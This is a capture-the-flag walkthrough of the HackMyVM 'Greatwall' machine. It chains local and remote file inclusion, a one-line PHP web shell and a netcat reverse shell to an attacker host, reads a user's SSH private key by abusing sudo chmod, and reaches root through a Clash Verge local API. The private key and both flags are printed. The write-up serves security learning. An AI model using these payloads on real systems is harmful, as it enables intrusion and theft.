# Greatwall

> **Notes**: VMware only. GLHF

This video was helpful with connecting VBox to VMWare network. [https://youtu.be/WLEd_aQvLWQ](https://youtu.be/WLEd_aQvLWQ)

## Recon

::: details nmap_scan.log
```log
Open 192.168.56.105:22
Open 192.168.56.105:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 192.168.56.105

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 dd:8c:5a:5a:8b:43:a1:27:81:13:ff:b6:be:b5:c6:e5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKRu5jciIdNNmfTqr0lMfefa78S29x6BomOO1L4LTfrFsfTOU1UWH6rMhYOO6/lwUi6D16FBbDL7I3RciwoyX8w=
|   256 e4:73:84:da:df:18:e2:f2:db:5e:11:93:b5:d9:54:74 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILXqxoPabwLw5VBYwTrRzVaoDU7Z1YHyzSNLVwV3v3xO
80/tcp open  http    syn-ack Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Hello World
|_http-server-header: Apache/2.4.62 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

Website is running some kind of url fetcher?

![writeup.png](/assets/pentest/hackmyvm/greatwall/writeup.png)

### LFI

Testing the **page** parameter with LFI payloads worked
```bash
└─$ curl -s 'http://greatwall.hmv/?page=file:///etc/passwd' | htmlq -t '.result' | grep sh$
            root:x:0:0:root:/root:/bin/bash
wall:x:1000:1000:wall,,,:/home/wall:/bin/bash
```

[Supported Protocols and Wrappers](https://www.php.net/manual/en/wrappers.php)

Only http and file is available. With `file:///` we have LFI, but can't read PHP files. If we can make use of `http://` we could probably do SSRF.
```bash
└─$ ffuf -u 'http://greatwall.hmv/?page=FUZZ://' -w t -fs 3158
file                    [Status: 200, Size: 3193, Words: 1235, Lines: 112, Duration: 4ms]
http                    [Status: 200, Size: 3193, Words: 1235, Lines: 112, Duration: 5ms]
```

Quick function to read files
```bash
└─$ lfi() { curl -s "http://greatwall.hmv/?page=file://$1" | htmlq -t '.result' }
```

Nothing useful came up from my enumeration

### RFI

Since `HTTP` is supported and pages are rendered, maybe we can also inject our PHP code into website.

[http://greatwall.hmv/?page=http://192.168.56.107/index.php](http://greatwall.hmv/?page=http://192.168.56.107/index.php)

![writeup-1.png](/assets/pentest/hackmyvm/greatwall/writeup-1.png)

### Reverse Shell (www-data)

Reverse shell on usual port (4444) kept failing, meaning there was a firewall in place. Allowed connections seems to be only 80 and 22, we needed 80 to serve PHP files for RFI so we can get reverse shell on 22.
```bash
└─$ echo '<?=`$_GET[0]`?>' > rev.php
└─$ curl 'http://greatwall.hmv/' -G --data-urlencode 'page=http://192.168.56.107/rev.php' --data-urlencode '0=busybox nc 192.168.56.107 22 -e /bin/bash'
---
└─$ nc -lvnp 22
id # No TTY
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script /dev/null -qc /bin/bash # Get TTY
www-data@greatwall:~/html$ 
# Ctrl + Z
└─$ stty raw -echo;fg; # Upgrade netcat shell
www-data@greatwall:~/html$ stty rows 47 cols 211;export TERM=xterm # Beautify
```

## Lateral Movement (wall)

Why does `www-data` have `sudo` permissions I have no idea.
```bash
www-data@greatwall:/opt$ sudo -l
Matching Defaults entries for www-data on greatwall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on greatwall:
    (wall) NOPASSWD: /bin/chmod
```

```bash
www-data@greatwall:/opt$ sudo -u wall chmod -R 777 /home/wall
www-data@greatwall:/opt$ find /home/wall -type f -ls
       15      4 -rwxrwxrwx   1 wall     wall         1808 May 11 00:25 /home/wall/user.flag
       39      4 -rwxrwxrwx   1 wall     wall          220 May 10 18:54 /home/wall/.bash_logout
       40      4 -rwxrwxrwx   1 wall     wall         3526 May 10 18:54 /home/wall/.bashrc
       41      4 -rwxrwxrwx   1 wall     wall          807 May 10 18:54 /home/wall/.profile
       18      4 -rwxrwxrwx   1 wall     wall          568 May 11 02:41 /home/wall/.ssh/authorized_keys
       17      4 -rwxrwxrwx   1 wall     wall          568 May 11 02:41 /home/wall/.ssh/id_rsa.pub
       16      4 -rwxrwxrwx   1 wall     wall         2602 May 11 02:41 /home/wall/.ssh/id_rsa
www-data@greatwall:/opt$ cat /home/wall/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA6yJfWc4tk8pNs4Em7Kpgb7kqMmqqB1wv6RDfLhVbaGkWlhuAPxX8
uGmbAob6/8J8fneffjGnQET7hTNsVUakFl7ra1VSL1u6GSyaIXgyYJl7Vp7TXb9J//Iw+I
T3ry30pss+AKfDwHyV43YZk/xYjP20k8CCFgDzsGT/qNwwjLKziWfxKGFZClyQuyjkoxzL
vIoDBRNO3KkzdYhTz/TZU0mWB1eGV74jX7W0/lddtMyDt7imrzPn0sqMwf4/J6ZpMWMy3y
Ojr4rgBntCEGuOgZi9YLG3gheQw0ieyOR9h/AJntwKkMRd7B9AqfCQlI1dXnjEDWObBwBD
fa4lDoKecxIK0gfiTiSflMxLRqfzIwuRZEL/PUNCz/RiQ2MBicOdUOI2w6ZF9fqoULYCRY
2vBqp+nL83fyLW7aZvKNmhkkAwF7yd5WrFaecv5wpMuI1504IBnmTIwnx+ImswOSzDr6av
+FDyaQ7fBGvgc6JPOqLna5Ewg6j368IHNDmN0q6fAAAFiE3mdfRN5nX0AAAAB3NzaC1yc2
EAAAGBAOsiX1nOLZPKTbOBJuyqYG+5KjJqqgdcL+kQ3y4VW2hpFpYbgD8V/LhpmwKG+v/C
fH53n34xp0BE+4UzbFVGpBZe62tVUi9buhksmiF4MmCZe1ae012/Sf/yMPiE968t9KbLPg
Cnw8B8leN2GZP8WIz9tJPAghYA87Bk/6jcMIyys4ln8ShhWQpckLso5KMcy7yKAwUTTtyp
M3WIU8/02VNJlgdXhle+I1+1tP5XXbTMg7e4pq8z59LKjMH+PyemaTFjMt8jo6+K4AZ7Qh
BrjoGYvWCxt4IXkMNInsjkfYfwCZ7cCpDEXewfQKnwkJSNXV54xA1jmwcAQ32uJQ6CnnMS
CtIH4k4kn5TMS0an8yMLkWRC/z1DQs/0YkNjAYnDnVDiNsOmRfX6qFC2AkWNrwaqfpy/N3
8i1u2mbyjZoZJAMBe8neVqxWnnL+cKTLiNedOCAZ5kyMJ8fiJrMDksw6+mr/hQ8mkO3wRr
4HOiTzqi52uRMIOo9+vCBzQ5jdKunwAAAAMBAAEAAAGAL97PF8r8h3ar7AwyvwMO4CAMAb
iqhhYUIPiQ32J0uiSO9x+BNBbHXUoOx2xwpGpViy/SdlAok1KX/G3UM+ZOWMmZV0BHG6Iq
mJ52gLLmWrlUnXV3ZcIgkC2gH7B+dpk+EkkVhe+h0EntACKWoYTCCG5Mebo7Ibyu4C4nyJ
qPfc2R9LsHI2fyR0RCKQBxz+14Yxmb9MgSCaWe9uI64f8g0a6ND1CX5rwsmns1boSd7MWo
WVqMAOZp34XiM0qOVAWyR/YmLi37rkIxk3qQPvMRooGJL1KL4Szlv/2FEGPwh3Tdyz1/Ys
OxCb1D8k9yD/zbBFZ9ybnI6byo7kFceFuPuCv3jzAyLi+YxCgDi7FEH/NOg6UMG+oN7hus
IDwP2vU6iKNW4WccM9KuGvFTYfrTeXE2mLgTY4KaZIj/8Omf3XpKO4Of6zP8dOAsbECi4K
rJc/nX6an0siiK/4P43uhM/DWhaXjSOSotyJ9MbwxXHfGPz0PkFECpqzm64YMwjKKVAAAA
wD9H1Z4qlfJ7igJ9tbvBKxrD073ywNtOoItuSab4yeG8EeU24x66HSWzrT6bQ+/KuV35aK
beC9oPcNmVp1DBunfCoUdA544QuY9V2u3GMwxexRzzFoMInvgPBvzLHcFc+JS7m3iZ5qIU
0VAN/6x1Y69HAo4h2EtB6PWT4pKFnbKFuPIgSrMfaKy0r+Lbo2oFwtS+KO9Okk9o+/Niia
HRmj8aoI+UilcsO6RjcuuKp4euGDdzr06oVrb1uUseoNkWtwAAAMEA+DTwCdrJOd6blGJm
1eMe6sGglfvRDq67zwPOX1HtU/XxS30dwEmno1VqisH6Fa3DKBp8C2NCA2K1o8Pav9VqT5
c3vNJLe1ezKFYkvXervh6remPS5HPkpyn4Irhd5pjO8PqvrrDGjHEgcAaUsiIM9JyTDETY
RUS90nSAOFaeyONRow9WCLY12wRPWn3FMvVGQJ0RJfSyWnsTv7YOa51hDXYlNAXCcNWCVF
sNPiTb5FiyzoXaZZa6UnddKJKrNraFAAAAwQDyhFvxPwhK1MiShSbpJ9kOw5/l5NFSZyKf
4UqE2yh7K+2OZLeQ4hgoVnP17D4JPZ4fbifsXejWiN4VHr4f0mBq0oXkLqB6BwM0AjDw1t
8yNNSDFjwIagasiPHWcsjg6xi09kNFYvw20bQNjhDF4yh/bNieYpjyqlzaKdZEVnG2kPnv
XqKg7j4rnHclz+HWgwHf+zBGq3a7QKSHs0XqM+Uh54Y6JOphHFLljpV6c6cKQjqB0u4fSP
QMXdH6a7iy89MAAAAOd2FsbEBncmVhdHdhbGwBAgMEBQ==
-----END OPENSSH PRIVATE KEY-----

# Reset the permissions
www-data@greatwall:/home/wall$ sudo -u wall chmod 750 /home/wall
www-data@greatwall:/home/wall$ sudo -u wall chmod 700 /home/wall/.ssh
www-data@greatwall:/home/wall$ sudo -u wall chmod 600 /home/wall/.ssh/authorized_keys
www-data@greatwall:/home/wall$ sudo -u wall chmod 600 /home/wall/.ssh/id_rsa
www-data@greatwall:/home/wall$ sudo -u wall chmod 600 /home/wall/.ssh/id_rsa.pub
```

> **Note**: Very important to reset permissions on `.ssh` directory or private keys won't work and silently fail.

## SSH (wall)

```bash
└─$ ssh -i id_rsa.wall wall@greatwall.hmv
wall@greatwall:~$ id
uid=1000(wall) gid=1000(wall) groups=1000(wall),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
```

### User.txt

```
wall@greatwall:~$ cat user.flag
flag{b088764475fa2a0a962fb9154f41c5b6}
```

## Privilege Escalation (root)

```bash
wall@greatwall:~$ sudo -l
Matching Defaults entries for wall on greatwall:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wall may run the following commands on greatwall:
    (ALL) NOPASSWD: /usr/bin/systemctl start clash-verge-service
```

```bash
wall@greatwall:~$ find /etc -name clash-verge-service.service -exec sh -c 'ls -alh {}; cat {}; echo;' \; 2>/dev/null
-rw-r--r-- 1 root root 256 May 11 01:28 /etc/systemd/system/clash-verge-service.service
[Unit]
Description=Clash Verge Service helps to launch Clash Core.
After=network-online.target nftables.service iptables.service

[Service]
Type=simple
ExecStart=/usr/bin/clash-verge-service
Restart=always
RestartSec=5

[Install]
WantedBy=multi-user.target
```

[clash-verge-rev](https://github.com/clash-verge-rev/clash-verge-rev): A modern GUI client based on Tauri, designed to run in Windows, macOS and Linux for tailored proxy experience

Identifying the version was tricky, application is GUI based but we could see install packages
```bash
wall@greatwall:~$ dpkg -l | grep clash-verge
ii  clash-verge                          2.2.2                           amd64        Clash Verge Rev
```

- [Case 20/100 > ⚠️VPN Proxy Clash Has a One-Click Remote Code Execution Vulnerability](https://x.com/Larry_Basics/status/1925587393870274706)
- [Clash Verge Client 1-Click RCE Vulnerability](https://zyen84kyvn.feishu.cn/docx/PXu6dsXf0onNdRxs8LfceNXjncb) (wish it was in English.. :/)

Research talks about port **9097**, but when lunched it's **33211**
```bash
wall@greatwall:~$ sudo systemctl start clash-verge-service
wall@greatwall:~$ ss -tunlp4
Netid    State     Recv-Q     Send-Q         Local Address:Port          Peer Address:Port    Process
udp      UNCONN    0          0                    0.0.0.0:68                 0.0.0.0:*
tcp      LISTEN    0          128                127.0.0.1:33211              0.0.0.0:*
tcp      LISTEN    0          128                  0.0.0.0:22                 0.0.0.0:*
```

When trying to replicate exploit it fails
```bash
wall@greatwall:~$ curl http://127.0.0.1:33211/configs -X PUT;echo
HTTP method not allowed
```

Searching for `"33211" "RCE" "Clash Verge"` on internet I found another post

[Clash Verge Privilege Escalation + Command Execution + Arbitrary File Write Vulnerabilities](https://linux.do/t/topic/639447)

Blog goes into details, POC is also included:

![writeup-2.png](/assets/pentest/hackmyvm/greatwall/writeup-2.png)

Usually I go for SUID `/bin/bash`, but I wanted to test something

Create a binary with following code
```c
#include <unistd.h>

int main() {
    setuid(1001);
    setgid(1001);
    execl("/bin/bash", "bash", NULL);
    return 1;
}
```

Compile and upload to remote
```bash
└─$ echo $'#include <unistd.h>\nvoid main() { setuid(0); setgid(0); execl("/bin/bash", "bash", NULL); }' | gcc -x c -static -o privesc -
└─$ scp -i id_rsa.wall ./privesc wall@greatwall.hmv:/tmp/privesc
```

```bash
wall@greatwall:~$ echo $'#!/bin/bash\nchown root:root /tmp/privesc\nchmod 4777 /tmp/privesc' > /tmp/privesc.sh
wall@greatwall:~$ chmod o+x /tmp/privesc.sh

wall@greatwall:~$ curl 127.0.0.1:33211/start_clash -H 'Content-Type: application/json' -d '{ "core_type":"verge-mihome", "bin_path":"/tmp/privesc.sh", "config_dir":"", "config_file":"", "log_file":"/tmp/privesc.log" }';echo;ls -alh /tmp/privesc;echo;cat /tmp/privesc.log;
{"code":0,"msg":"ok","data":null}
-rwxrwxrwx 1 root root 742K Sep  3 23:55 /tmp/privesc

Spawning process: /tmp/privesc.sh -d  -f
```

> **Note**: Use custom binary because it adds `-d  -f` flags and `/bin/ba[sh]` fails to execute.

```bash
root@greatwall:~# id
uid=0(root) gid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),1000(wall)
```

I wanted to experiment with becoming other user fully without reverse shell:
```bash
# /tmp/privesc
root@greatwall:~# id
uid=0(root) gid=0(root) groups=0(root) ...
# /tmp/rootbash -p
rootbash-5.2# id
uid=1000(wall) gid=1000(wall) euid=0(root) groups=1000(wall) ...
```
 
- **UID** → “who I really am”
- **EUID** → “who the system thinks I am for permissions”

Having only an **effective UID** of root doesn’t grant you `sudo` access, but having your **real UID** set to root does.

### Root.txt

```bash
root@greatwall:~# tail -1 /root/r007.7x7oZzZzZzzzz
flag{b3d2a9f34869484b74db97411cf1eb3b}
```